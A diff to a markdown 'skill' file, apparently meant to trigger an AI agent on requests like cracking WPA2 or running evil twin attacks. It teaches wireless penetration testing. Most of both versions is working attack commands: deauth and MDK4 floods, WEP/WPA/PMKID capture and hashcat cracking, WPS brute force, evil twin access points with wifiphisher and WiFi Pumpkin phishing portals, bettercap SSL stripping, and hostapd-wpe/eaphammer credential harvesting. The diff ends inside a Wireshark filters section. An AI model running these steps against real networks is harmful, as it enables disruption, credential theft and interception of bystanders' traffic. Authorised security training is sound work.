@@ -1,840 +1,849 @@
 ---
 name: wireless-security-wifi-penetration-testing
-description: Expert skill for wireless security testing and WiFi penetration testing using aircrack-ng, monitor mode, WEP/WPA/WPA2/WPA3 attacks, and rogue AP techniques
+description: Master wireless security and WiFi penetration testing with aircrack-ng, capturing handshakes, cracking WEP/WPA/WPA2/WPA3, and enterprise assessment
 triggers:
-  - "help me crack a WPA2 handshake"
-  - "how do I capture WiFi handshakes with aircrack"
-  - "set up monitor mode on my wireless adapter"
-  - "perform a deauth attack on a wireless network"
-  - "create an evil twin access point"
-  - "crack WEP encryption with aircrack-ng"
-  - "analyze wireless traffic with wireshark"
-  - "set up a rogue access point for testing"
+  - how do I crack a WPA2 handshake
+  - set my wifi adapter to monitor mode
+  - capture wifi handshake with aircrack
+  - perform evil twin attack on wireless network
+  - crack WEP encryption with aircrack-ng
+  - test enterprise wifi security with RADIUS
+  - deauth wireless clients for handshake capture
+  - analyze 802.11 traffic with wireshark
 ---
 
 # Wireless Security & WiFi Penetration Testing
 
 > Skill by [ara.so](https://ara.so) — Security Skills collection.
 
-This skill provides comprehensive wireless security testing capabilities using the aircrack-ng suite and related tools. It covers 802.11 reconnaissance, WEP/WPA/WPA2/WPA3 attacks, rogue access points, wireless MITM, and enterprise WiFi assessment.
+This skill provides comprehensive expertise in wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 protocol analysis, monitor mode configuration, WEP/WPA/WPA2/WPA3 attacks, rogue access points, enterprise wireless assessment, and professional reporting.
 
-## Overview
+## What This Project Does
 
-This project is a hands-on curriculum for wireless penetration testing that covers:
+The Wireless Security & WiFi Penetration Testing curriculum teaches:
 
-- **802.11 Fundamentals**: Standards, frame types, encryption protocols
-- **Reconnaissance**: Hidden SSID discovery, traffic analysis, network enumeration
-- **WEP Attacks**: Cracking, Chop-Chop, fragmentation, Caffe Latte
-- **WPA/WPA2 Attacks**: Handshake capture, PMKID, dictionary/GPU cracking
-- **WPA3 Attacks**: Dragonblood, downgrade attacks
-- **Rogue APs**: Evil twin, captive portals, wireless MITM
-- **Enterprise**: EAP/RADIUS assessment
-- **Defense**: Detection, hardening, 802.11w
+- **802.11 Protocol Fundamentals**: Frame types, encryption (WEP/WPA/WPA2/WPA3), authentication mechanisms
+- **Wireless Reconnaissance**: SSID discovery, hidden network enumeration, traffic analysis
+- **Attack Techniques**: WEP cracking, WPA/WPA2 handshake capture and cracking, PMKID attacks, WPS exploitation
+- **Advanced Attacks**: Evil twin, rogue AP, wireless MITM, WPA-TKIP, WPA3 Dragonblood
+- **Enterprise Assessment**: EAP/RADIUS testing, 802.1X exploitation
+- **Defense**: Management frame protection (802.11w), WIDS, hardening recommendations
 
-## Prerequisites
+## Hardware Requirements
 
-### Hardware Requirements
+**Critical**: You need an injection-capable wireless adapter. Onboard laptop WiFi typically cannot enter monitor mode or inject packets.
 
-**Critical**: You need an injection-capable wireless adapter. Not all chipsets support monitor mode and packet injection.
+### Recommended Chipsets
+- **Atheros AR9271** (e.g., TP-Link TL-WN722N v1, Alfa AWUS036NHA)
+- **Ralink RT3070/RT5372** (e.g., Alfa AWUS036NH)
 
-**Recommended chipsets**:
-- Atheros AR9271 (e.g., Alfa AWUS036NHA, TP-Link TL-WN722N v1)
-- Ralink RT3070/RT5372 (e.g., Alfa AWUS036NH, Panda PAU05)
-
-**DO NOT USE**:
-- Built-in laptop WiFi (rarely supports injection)
-- TP-Link TL-WN722N v2/v3 (different chipset, no injection)
-
-### Software Requirements
-
-**Base OS**: Kali Linux (pre-installed tools) or any Linux with packages below.
-
-**Core tools**:
+### Verification
 ```bash
-# Aircrack-ng suite (capture, injection, cracking)
-sudo apt update
-sudo apt install aircrack-ng
+# List wireless interfaces
+iwconfig
 
-# Additional tools
-sudo apt install \
+# Check if adapter supports monitor mode
+iw list | grep -A 10 "Supported interface modes"
+
+# Look for:
+# * monitor
+```
+
+## Environment Setup
+
+### Operating System
+Use Kali Linux (bare-metal preferred for timing-sensitive attacks, VM acceptable with USB passthrough).
+
+### Core Tools Installation
+```bash
+# Update package list
+sudo apt update
+
+# Install aircrack-ng suite (usually pre-installed on Kali)
+sudo apt install -y aircrack-ng
+
+# Install additional wireless tools
+sudo apt install -y \
   hashcat \
-  hcxdumptool hcxtools \
-  reaver bully wash \
+  hcxtools \
+  hcxdumptool \
+  reaver \
+  bully \
   kismet \
   wireshark \
-  hostapd dnsmasq \
-  wifiphisher
+  tcpdump \
+  hostapd \
+  dnsmasq \
+  bettercap
+
+# Optional: Evil twin/captive portal frameworks
+sudo apt install -y wifiphisher
+pip3 install wifipumpkin3
 ```
 
-## Initial Setup
-
-### 1. Verify Adapter Capabilities
-
+### Regulatory Domain Configuration
 ```bash
-# Check if adapter is detected
-sudo airmon-ng
+# Set regulatory domain (use your country code)
+sudo iw reg set US
 
-# Expected output shows your wireless interface (e.g., wlan0)
-# PHY     Interface       Driver          Chipset
-# phy0    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271
+# Verify
+iw reg get
+```
 
-# Check for conflicting processes
-sudo airmon-ng check
+**Warning**: Only transmit RF signals in compliance with local regulations and on networks you own or have written permission to test.
 
-# Kill interfering processes
+## Monitor Mode Configuration
+
+### Enable Monitor Mode
+```bash
+# Method 1: Using airmon-ng (recommended)
+# Stop interfering processes
 sudo airmon-ng check kill
-```
 
-### 2. Enable Monitor Mode
-
-```bash
-# Start monitor mode on wlan0
+# Enable monitor mode on wlan0
 sudo airmon-ng start wlan0
 
-# Verify monitor interface created (wlan0mon or wlan0 in monitor mode)
-sudo iwconfig
+# Interface will be renamed to wlan0mon
+iwconfig
 
-# wlan0mon should show Mode:Monitor
+# Method 2: Manual configuration
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
 ```
 
-### 3. Test Packet Injection
-
+### Test Packet Injection
 ```bash
-# Test injection capability (-9 test mode, 00:11:22:33:44:55 is test MAC)
+# Test injection capability (critical for attacks)
 sudo aireplay-ng --test wlan0mon
 
 # Successful output shows:
-# Trying broadcast probe requests...
 # Injection is working!
 # Found X APs
 ```
 
-If injection fails, your adapter/driver doesn't support it. Try a different adapter.
-
-### 4. Set Regulatory Domain (Optional but Recommended)
-
+### Disable Monitor Mode
 ```bash
-# Check current regulatory domain
-sudo iw reg get
+# Using airmon-ng
+sudo airmon-ng stop wlan0mon
 
-# Set to your country (e.g., US for USA, GB for UK)
-sudo iw reg set US
+# Restart NetworkManager
+sudo systemctl restart NetworkManager
 
-# Verify
-sudo iw reg get
+# Manual method
+sudo ip link set wlan0mon down
+sudo iw dev wlan0mon set type managed
+sudo ip link set wlan0 up
 ```
 
-## Reconnaissance Techniques
+## Wireless Reconnaissance
 
-### Basic Wireless Scanning
-
+### Basic Network Discovery
 ```bash
-# Scan all channels, all encryption types
+# Discover all nearby access points
 sudo airodump-ng wlan0mon
 
-# Scan specific channel (e.g., channel 6)
-sudo airodump-ng --channel 6 wlan0mon
+# Output columns:
+# BSSID: MAC address of AP
+# PWR: Signal strength
+# Beacons: Broadcast frames
+# #Data: Data packets
+# CH: Channel
+# ENC: Encryption type (WEP/WPA/WPA2)
+# ESSID: Network name
 
-# Scan 5GHz band (channels 36+)
-sudo airodump-ng --band a wlan0mon
+# Target specific channel
+sudo airodump-ng -c 6 wlan0mon
 
-# Filter by encryption type (WPA2 only)
-sudo airodump-ng --encrypt WPA2 wlan0mon
-
-# Write captures to file
-sudo airodump-ng -w capture --output-format pcap wlan0mon
+# Target specific BSSID and write to file
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
 ```
 
-**Key output columns**:
-- `BSSID`: Access point MAC address
-- `PWR`: Signal strength (higher = closer)
-- `CH`: Channel number
-- `ENC`: Encryption (OPN, WEP, WPA, WPA2, WPA3)
-- `ESSID`: Network name (SSID)
-
-### Target Specific Network
-
+### Hidden SSID Discovery
 ```bash
-# Lock onto specific BSSID and channel
-sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w capture wlan0mon
+# Monitor channel with hidden SSID
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w hidden wlan0mon
 
-# This is crucial before launching attacks - you need:
-# 1. Exact BSSID
-# 2. Correct channel
-# 3. Capture file for handshakes
+# Deauth a client to force reconnect (reveals SSID)
+# In another terminal:
+sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon
 ```
 
-### Discover Hidden SSIDs
-
+### Advanced Scanning with Kismet
 ```bash
-# Method 1: Wait for client connection (SSID in probe/association)
-sudo airodump-ng --bssid <TARGET_BSSID> -c <CHANNEL> wlan0mon
-
-# Method 2: Deauth client to force reconnection
-# In separate terminal while airodump-ng runs:
-sudo aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon
-
-# SSID appears in airodump when client reconnects
-```
-
-### Advanced Reconnaissance with Kismet
-
-```bash
-# Start Kismet (web UI on http://localhost:2501)
+# Start Kismet (web interface on http://localhost:2501)
 sudo kismet
 
-# Or headless with config
+# Or headless mode
 sudo kismet -c wlan0mon --override wardrive
-
-# Kismet provides:
-# - Device tracking across channels
-# - Manufacturer identification (OUI lookup)
-# - Wireless IDS alerts
-# - Client relationship mapping
 ```
 
-## WEP Attacks
+## WEP Cracking
 
-**Note**: WEP is deprecated but still found on legacy devices.
-
-### WEP Cracking with ARP Replay
-
+### Passive Capture Method
 ```bash
-# Terminal 1: Capture IVs (Initialization Vectors)
-sudo airodump-ng --bssid <AP_BSSID> -c <CHANNEL> -w wep_capture wlan0mon
+# Capture IVs (Initialization Vectors)
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep wlan0mon
 
-# Terminal 2: Fake authentication (required for injection)
-sudo aireplay-ng --fakeauth 0 -a <AP_BSSID> -h <YOUR_ADAPTER_MAC> wlan0mon
+# Wait for 50,000+ IVs, then crack
+aircrack-ng wep-01.cap
 
-# Terminal 3: ARP replay attack (generates traffic for IVs)
-sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <YOUR_ADAPTER_MAC> wlan0mon
-
-# Wait for "Data packets" in airodump to reach ~20,000-50,000
-
-# Terminal 4: Crack WEP key
-sudo aircrack-ng wep_capture-01.cap
-
-# Key appears as: KEY FOUND! [ XX:XX:XX:XX:XX ] (ASCII: password)
+# Key will be displayed when cracked
 ```
 
-### WEP Chop-Chop Attack
+### Active Injection Methods
 
+#### ARP Request Replay Attack
 ```bash
-# When ARP replay doesn't work (no clients, no traffic)
-sudo aireplay-ng --chopchop -b <AP_BSSID> -h <YOUR_MAC> wlan0mon
+# Terminal 1: Capture IVs
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep-arp wlan0mon
 
-# Creates a .cap and .xor file with decrypted packet
+# Terminal 2: Fake authentication (if needed)
+sudo aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
 
-# Forge ARP packet from decrypted data
-sudo packetforge-ng -0 -a <AP_BSSID> -h <YOUR_MAC> -k 255.255.255.255 \
-  -l 255.255.255.255 -y replay_dec-*.xor -w forge.cap
+# Terminal 3: ARP replay attack
+sudo aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
 
-# Replay forged packet
-sudo aireplay-ng --interactive -r forge.cap wlan0mon
-
-# Capture IVs and crack as above
+# Wait for ARP packets, then replay to generate IVs rapidly
+# Crack when you have 20,000+ IVs
+aircrack-ng wep-arp-01.cap
 ```
 
-## WPA/WPA2 Handshake Attacks
+#### ChopChop Attack (No Clients Needed)
+```bash
+# Capture packets
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w chopchop wlan0mon
 
-### Capture WPA2 Handshake
+# Run chopchop to decrypt a packet
+sudo aireplay-ng --chopchop -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
 
+# Creates .xor file, use packetforge-ng to create ARP request
+sudo packetforge-ng -0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF \
+  -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w arp-request
+
+# Inject forged packet
+sudo aireplay-ng --interactive -r arp-request wlan0mon
+
+# Crack with generated IVs
+aircrack-ng chopchop-01.cap
+```
+
+## WPA/WPA2 Cracking
+
+### Handshake Capture
 ```bash
 # Terminal 1: Start capture on target network
-sudo airodump-ng --bssid <AP_BSSID> -c <CHANNEL> -w wpa_handshake wlan0mon
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa-handshake wlan0mon
 
-# Terminal 2: Deauthenticate a client to force handshake
-# Wait until you see a client (STATION) in airodump, then:
-sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
+# Terminal 2: Deauth a client to force handshake
+# Wait until you see a connected client (STATION column)
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
 
-# Alternative: Deauth all clients
-sudo aireplay-ng --deauth 10 -a <AP_BSSID> wlan0mon
-
-# Watch airodump-ng top-right for "WPA handshake: <BSSID>"
-# Stop capture with Ctrl+C once handshake captured
+# Look for "WPA handshake: 00:11:22:33:44:55" in airodump-ng output
+# Stop capture with Ctrl+C
 ```
 
-### Crack Handshake with Aircrack-ng (CPU)
-
+### Verify Handshake Capture
 ```bash
-# Using wordlist
-sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_handshake-01.cap
+# Check if handshake was captured
+aircrack-ng wpa-handshake-01.cap
 
-# Using multiple wordlists
-sudo aircrack-ng -w wordlist1.txt,wordlist2.txt wpa_handshake-01.cap
+# Should show:
+# 1 handshake
+# Or use tshark
+tshark -r wpa-handshake-01.cap -Y "eapol" | grep -i "key"
+```
 
-# Specify BSSID if multiple networks in capture
-sudo aircrack-ng -b <AP_BSSID> -w rockyou.txt wpa_handshake-01.cap
+### Dictionary Attack with aircrack-ng
+```bash
+# Crack with wordlist
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa-handshake-01.cap
 
-# Successful crack shows:
+# Example output when successful:
 # KEY FOUND! [ password123 ]
 ```
 
-### Crack Handshake with Hashcat (GPU)
-
+### GPU Acceleration with hashcat
 ```bash
-# Convert .cap to hashcat format
-sudo aircrack-ng wpa_handshake-01.cap -J wpa_handshake
+# Convert capture to hashcat format
+hcxpcapngtool -o hash.hc22000 wpa-handshake-01.cap
 
-# This creates wpa_handshake.hccapx (or .22000 for newer hashcat)
-
-# Or use hcxpcapngtool for modern format
-hcxpcapngtool -o wpa_handshake.22000 wpa_handshake-01.cap
+# Or for older hashcat versions
+wlanhcx2ssid hash.hc22000
 
 # Crack with hashcat (mode 22000 for WPA/WPA2)
-hashcat -m 22000 -a 0 wpa_handshake.22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt
 
-# With rules for mutations
-hashcat -m 22000 -a 0 wpa_handshake.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# With GPU optimization
+hashcat -m 22000 -a 0 -w 3 -O hash.hc22000 /usr/share/wordlists/rockyou.txt
 
 # Show cracked passwords
-hashcat -m 22000 wpa_handshake.22000 --show
+hashcat -m 22000 hash.hc22000 --show
 ```
 
-### PMKID Attack (Clientless WPA2)
-
+### PMKID Attack (No Client Required)
 ```bash
-# Capture PMKID (no client deauth needed)
+# Capture PMKID with hcxdumptool
 sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
 
-# Wait for PMKID to be captured (appears in status)
-# Ctrl+C to stop
+# Or target specific AP
+sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist=targets.txt --enable_status=15
+
+# targets.txt contains BSSID:
+# 001122334455
 
 # Convert to hashcat format
-hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
 
 # Crack PMKID
-hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt
-
-# PMKID is often faster than handshake capture
+hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
 ```
 
-## Deauthentication Attacks
-
-### Basic Deauth
-
+### Cowpatty with Rainbow Tables
 ```bash
-# Deauth specific client (10 packets)
-sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
+# Generate rainbow table for ESSID
+genpmk -f /usr/share/wordlists/rockyou.txt -d pmk-database -s "TargetSSID"
 
-# Continuous deauth (0 = infinite)
-sudo aireplay-ng --deauth 0 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
-
-# Broadcast deauth (all clients)
-sudo aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
-```
-
-### MDK4 for Advanced DoS
-
-```bash
-# Install MDK4
-sudo apt install mdk4
-
-# Beacon flood (creates fake APs)
-sudo mdk4 wlan0mon b -f fake_ssids.txt -a -s 1000
-
-# Deauth flood (more aggressive than aireplay)
-sudo mdk4 wlan0mon d -c <CHANNEL> -b <AP_BSSID>
-
-# Authentication DoS
-sudo mdk4 wlan0mon a -a <AP_BSSID> -i <CLIENT_MAC>
-```
-
-## Rogue Access Point Attacks
-
-### Evil Twin with Airbase-ng
-
-```bash
-# Create fake AP with same ESSID as target
-sudo airbase-ng -e "TargetNetwork" -c <CHANNEL> wlan0mon
-
-# With specific BSSID spoofing
-sudo airbase-ng -e "TargetNetwork" -a <TARGET_BSSID> -c <CHANNEL> wlan0mon
-
-# Airbase creates at0 interface - bridge to internet
-sudo ifconfig at0 up
-sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0
-```
-
-### Evil Twin with Hostapd + DNSmasq
-
-```bash
-# Create hostapd config
-cat > evil_twin.conf << 'EOF'
-interface=wlan0mon
-driver=nl80211
-ssid=TargetNetwork
-hw_mode=g
-channel=6
-macaddr_acl=0
-ignore_broadcast_ssid=0
-auth_algs=1
-wpa=2
-wpa_passphrase=password123
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-EOF
-
-# Start hostapd
-sudo hostapd evil_twin.conf
-
-# In separate terminal, configure DHCP
-sudo dnsmasq -C dnsmasq.conf -d
-
-# dnsmasq.conf:
-# interface=wlan0mon
-# dhcp-range=192.168.1.10,192.168.1.100,12h
-# dhcp-option=3,192.168.1.1
-# dhcp-option=6,192.168.1.1
-```
-
-### Automated Evil Twin with Wifiphisher
-
-```bash
-# Install wifiphisher
-sudo apt install wifiphisher
-
-# Automatic evil twin with captive portal
-sudo wifiphisher -aI wlan0mon -e "TargetNetwork" -p firmware-upgrade
-
-# Available phishing scenarios:
-# - firmware-upgrade (fake router update)
-# - oauth-login (fake Google/Facebook login)
-# - browser-plugin-update
-# - wifi_connect (WPA password harvest)
-
-# Captured credentials saved to wifiphisher.log
-```
-
-### Wireless MITM with Bettercap
-
-```bash
-# Install bettercap
-sudo apt install bettercap
-
-# Start bettercap on rogue AP interface
-sudo bettercap -iface at0
-
-# Interactive commands:
-# net.probe on
-# set arp.spoof.targets 192.168.1.0/24
-# arp.spoof on
-# net.sniff on
-# set http.proxy.sslstrip true
-# http.proxy on
-
-# Captures credentials, cookies, HTTP traffic
+# Crack using precomputed PMKs
+cowpatty -d pmk-database -r wpa-handshake-01.cap -s "TargetSSID"
 ```
 
 ## WPS Attacks
 
-### WPS PIN Brute Force with Reaver
-
+### WPS Detection
 ```bash
 # Scan for WPS-enabled APs
 sudo wash -i wlan0mon
 
-# Look for "WPS Locked: No" in output
+# Output shows:
+# BSSID, Channel, RSSI, WPS Version, WPS Locked, ESSID
+```
 
-# Attack with Reaver (can take hours)
-sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -vv
+### Reaver WPS PIN Attack
+```bash
+# Basic attack
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
 
-# With delay to avoid lockout
-sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -vv -d 5 -T 0.5 -r 3:15
+# Advanced options
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -d 2 -T 0.5 -r 3:15
 
 # Options:
-# -d 5: 5 second delay between attempts
-# -T 0.5: timeout for each attempt
-# -r 3:15: sleep 15 seconds after 3 failures
+# -c: Channel
+# -d: Delay between PIN attempts
+# -T: Timeout per PIN
+# -r: Sleep after X failures for Y seconds
+# -vv: Verbose output
+
+# If AP has rate limiting
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -L -N -d 15 -T 0.5 -r 3:60
 ```
 
-### Pixie Dust Attack with Reaver
-
+### Bully Alternative
 ```bash
-# Faster attack exploiting weak random number generation
-sudo reaver -i wlan0mon -b <AP_BSSID> -c <CHANNEL> -K -vv
+# Bully WPS attack
+sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3
 
-# -K enables Pixie Dust attack
-# Success rate depends on router model/firmware
+# With rate limiting protection
+sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -d -v 3
 ```
 
-## WPA3 Attacks
+## Evil Twin & Rogue AP Attacks
 
-### Dragonblood (CVE-2019-13377)
-
+### Basic Evil Twin with hostapd
 ```bash
-# Install dragonslayer toolkit
-git clone https://github.com/vanhoefm/dragonslayer.git
-cd dragonslayer
+# Create hostapd configuration
+cat > evil-twin.conf << 'EOF'
+interface=wlan0mon
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+EOF
 
-# Test for Dragonblood vulnerability
-sudo ./dragonslayer.py wlan0mon <CHANNEL> <AP_BSSID> <ESSID>
+# Start rogue AP
+sudo hostapd evil-twin.conf
 
-# If vulnerable, performs downgrade to WPA2
-# Then capture handshake and crack normally
+# In another terminal, configure DHCP
+sudo dnsmasq -C /dev/null --dhcp-range=192.168.1.50,192.168.1.150 \
+  --interface=wlan0mon --bind-interfaces --except-interface=lo
 ```
 
-### WPA3 Downgrade Attack
-
+### Evil Twin with Internet Access (MITM)
 ```bash
-# Use hostapd-wpe for WPA3 testing
-git clone https://github.com/OpenSecurityResearch/hostapd-wpe
-cd hostapd-wpe
-make
+# Configure hostapd
+cat > evil-twin-mitm.conf << 'EOF'
+interface=wlan0mon
+driver=nl80211
+ssid=CoffeeShop_Guest
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
 
-# Configure hostapd-wpe to force WPA2 transition mode
-# Then capture handshake as normal WPA2 attack
+# Start hostapd
+sudo hostapd evil-twin-mitm.conf &
+
+# Assign IP to interface
+sudo ip addr add 192.168.100.1/24 dev wlan0mon
+sudo ip link set wlan0mon up
+
+# Configure DHCP
+sudo dnsmasq -C dnsmasq-evil.conf
+
+# dnsmasq-evil.conf:
+# interface=wlan0mon
+# dhcp-range=192.168.100.10,192.168.100.250,12h
+# dhcp-option=3,192.168.100.1
+# dhcp-option=6,8.8.8.8
+# server=8.8.8.8
+
+# Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Configure NAT (assume eth0 is internet-connected)
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -o wlan0mon -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+# Capture credentials with SSL stripping
+sudo bettercap -iface wlan0mon
+# In bettercap console:
+# > set http.proxy.sslstrip true
+# > set net.sniff.verbose true
+# > http.proxy on
+# > net.sniff on
 ```
 
-## Enterprise WiFi (EAP/RADIUS) Testing
-
-### Capture EAP Handshake
-
+### Automated Evil Twin with wifiphisher
 ```bash
-# Capture enterprise WiFi traffic
-sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w eap_capture wlan0mon
+# Target specific AP and clone it
+sudo wifiphisher -aI wlan0mon -e "TargetSSID" -p firmware-upgrade
 
-# Deauth to force EAP re-authentication
-sudo aireplay-ng --deauth 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
+# Available phishing scenarios:
+# -p firmware-upgrade: Fake firmware update page
+# -p oauth-login: Fake OAuth login
+# -p browser-plugin: Fake browser plugin update
 
-# Look for EAPOL frames in capture
+# Custom deauth interface
+sudo wifiphisher -aI wlan0mon -jI wlan1mon -e "TargetSSID"
 ```
 
-### Rogue RADIUS Server with Hostapd-WPE
-
+### Captive Portal with WiFi Pumpkin 3
 ```bash
-# Install hostapd-wpe
+# Start WiFi Pumpkin 3
+sudo wifipumpkin3
+
+# In wp3 console:
+wp3 > set interface wlan0mon
+wp3 > set ssid "Free_Airport_WiFi"
+wp3 > set proxy noproxy
+wp3 > plugins
+wp3 > use captiveflask
+wp3 > set templates LoginPage
+wp3 > start
+```
+
+## Deauthentication Attacks
+
+### Broadcast Deauth (All Clients)
+```bash
+# Deauth all clients from AP
+sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon
+
+# Send 10 deauth packets
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon
+```
+
+### Targeted Deauth (Specific Client)
+```bash
+# Deauth specific client
+sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+# Deauth for handshake capture (gentler)
+sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+### MDK4 Beacon Flood
+```bash
+# Install mdk4
+sudo apt install mdk4
+
+# Beacon flood attack (creates fake APs)
+sudo mdk4 wlan0mon b -f ssid-list.txt -a -s 1000
+
+# Deauth flood
+sudo mdk4 wlan0mon d -c 6 -b blacklist.txt
+
+# blacklist.txt contains target BSSIDs:
+# 00:11:22:33:44:55
+```
+
+## Enterprise WPA (EAP/RADIUS) Assessment
+
+### Reconnaissance of Enterprise Networks
+```bash
+# Capture EAP authentication attempts
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w eap-capture wlan0mon
+
+# Look for EAP frames in Wireshark
+wireshark eap-capture-01.cap
+# Filter: eapol or eap or radius
+```
+
+### Evil Twin for EAP Credential Harvesting
+```bash
+# Create fake enterprise AP with hostapd-wpe
 sudo apt install hostapd-wpe
 
-# Configure enterprise evil twin
+# Configure hostapd-wpe
 cat > hostapd-wpe.conf << 'EOF'
 interface=wlan0mon
+driver=nl80211
 ssid=CorporateWiFi
-channel=6
 hw_mode=g
+channel=6
 ieee8021x=1
 eapol_key_index_workaround=0
 eap_server=1
-eap_user_file=hostapd.eap_user
-ca_cert=/etc/hostapd-wpe/ca.pem
-server_cert=/etc/hostapd-wpe/server.pem
-private_key=/etc/hostapd-wpe/server.key
-dh_file=/etc/hostapd-wpe/dhparam.pem
+eap_user_file=hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+private_key_passwd=
+dh_file=/etc/hostapd-wpe/certs/dh
 wpa=2
 wpa_key_mgmt=WPA-EAP
 wpa_pairwise=CCMP
 EOF
 
-# Start rogue RADIUS
+# Create eap_user file
+cat > hostapd-wpe.eap_user << 'EOF'
+* PEAP,TTLS,TLS,FAST
+"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC "password" [2]
+EOF
+
+# Start hostapd-wpe
 sudo hostapd-wpe hostapd-wpe.conf
 
-# Captured credentials in /var/log/hostapd-wpe/
-# Look for MSCHAP challenge/response for cracking
+# Captured credentials and challenge/response in:
+# /var/log/hostapd-wpe.log
+
+# Crack MSCHAP challenges with hashcat
+# Extract from log and format for hashcat mode 5500
+hashcat -m 5500 -a 0 mschap.hash /usr/share/wordlists/rockyou.txt
 ```
 
-### Crack EAP Credentials
-
+### eaphammer for Advanced EAP Attacks
 ```bash
-# Extract MSCHAP from hostapd-wpe log
-grep "mschap:" /var/log/hostapd-wpe/hostapd-wpe.log > mschap.txt
+# Clone eaphammer
+git clone https://github.com/s0lst1c3/eaphammer.git
+cd eaphammer
+./kali-setup
 
-# Convert to hashcat format
-# Format: username:::challenge:response
+# Evil twin with automatic certificate generation
+sudo ./eaphammer -i wlan0mon --channel 6 --auth wpa-eap --essid CorporateWiFi \
+  --creds
 
-# Crack with hashcat (mode 5500 for NTLMv1)
-hashcat -m 5500 -a 0 mschap.txt rockyou.txt
+# Targeted attack against known users
+sudo ./eaphammer -i wlan0mon --channel 6 --auth wpa-eap --essid CorporateWiFi \
+  --hostile-portal
+
+# GTC downgrade attack
+sudo ./eaphammer -i wlan0mon --essid CorporateWiFi --creds --negotiate gtc-downgrade
 ```
 
 ## Traffic Analysis
 
-### Wireshark for 802.11
-
+### Wireshark Filters for 802.11
 ```bash
-# Open capture in Wireshark
-wireshark capture-01.cap
+# Capture traffic
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w analysis wlan0mon
 
-# Key filters:
-# wlan.fc.type_subtype == 0x08  (Beacon frames)
-# wlan.fc.type_subtype == 0x00  (Association request)
-# wlan.fc.type_subtype == 0x0c  (Deauthentication)
-# eapol                         (WPA handshake frames)
-# wlan.addr == <MAC>            (Traffic to/from MAC)
+# Open in Wireshark
+wireshark analysis-01.cap
 
-# Decrypt WPA2 traffic (if you have PSK)
+# Useful filters:
+# All EAPOL (handshake) frames:
+eapol
+
+# Beacon frames:
+wlan.fc.type_subtype == 0x08
+
+# Probe requests (client scanning):
+wlan.fc.type_subtype == 0x04
+
+# Deauthentication frames:
+wlan.fc.type_subtype == 0x0c
+
+# Data frames:
+wlan.fc.type == 2
+
+# Specific BSSID:
+wlan.bssid == 00:11:22:33:44:55
+
